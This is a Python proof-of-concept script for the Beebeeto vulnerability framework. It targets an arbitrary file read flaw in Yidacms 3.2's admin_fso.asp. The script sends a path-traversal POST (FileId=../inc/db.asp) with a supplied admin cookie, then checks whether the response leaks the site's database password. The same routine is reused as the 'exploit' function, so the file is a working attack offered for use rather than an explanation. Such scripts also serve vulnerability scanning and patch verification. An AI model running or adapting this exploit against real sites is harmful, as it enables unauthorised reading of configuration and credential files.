#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0218',
            'name': 'Yidacms v3.2 /Yidacms/admin/admin_fso.asp 任意文件读取漏洞 POC',
            'author': 'user1018',
            'create_date': '2014-12-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Yidacms',
            'vul_version': ['3.2'],
            'type': 'Arbitrary File Read',
            'tag': ['Yidacms漏洞', 'Yidacms任意文件读取漏洞', '/Yidacms/admin/admin_fso.asp', 'asp'],
            'desc': '''
                    /Yidacms/admin/admin_fso.asp在读取文件时，没有任何过滤处理，直接拼接文件路径，然后直接读取。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-074083',
            ],
        },
    }

    # 定制命令行参数
    def _init_user_parser(self):
        self.user_parser.add_option('-c','--cookie',
                                    action='store', dest='cookie', type='string', default=None,
                                    help='this poc need to login, so special cookie '
                                    'for target must be included in http headers.')


    @classmethod
    def verify(cls, args):
        headers_cookie = {"Cookie":args['options']['cookie']}
        verify_url = args['options']['target'] + '/admin/admin_fso.asp?action=Edit'
        post_content = r'''FileId=../inc/db.asp&ThisDir='''
        req = urllib2.Request(verify_url, post_content, headers=headers_cookie)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Data: ' + post_content
        content = urllib2.urlopen(req).read()
        if 'webpath' in content and 'YidaCms_Sqlpass' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['post_content'] = post_content
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())